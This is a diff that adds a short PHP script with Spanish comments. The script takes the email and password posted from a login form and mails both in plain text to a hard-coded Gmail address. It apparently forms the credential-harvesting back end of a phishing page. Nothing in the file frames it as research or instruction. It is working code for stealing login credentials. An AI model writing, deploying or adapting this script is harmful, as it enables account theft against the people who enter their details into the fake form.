@@ -1,0 +1,24 @@
+<?php
+// Configura los datos del correo
+$to = 'storiesflash496@gmail.com';  // Cambia esto por la dirección de correo a la que deseas enviar los datos
+$subject = 'Datos de inicio de sesión';
+$headers = "From: no-reply@tudominio.com\r\n";  // Cambia esto por un correo válido de tu dominio
+$headers .= "Reply-To: no-reply@tudominio.com\r\n";  // Cambia esto por un correo válido de tu dominio
+$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+
+// Recoge los datos del formulario
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+// Crea el mensaje del correo
+$message = "Datos de inicio de sesión:\n";
+$message .= "Correo electrónico: $email\n";
+$message .= "Contraseña: $password\n";
+
+// Envía el correo
+if (mail($to, $subject, $message, $headers)) {
+    echo 'El correo ha sido enviado.';
+} else {
+    echo 'Hubo un problema al enviar el correo.';
+}
+?>
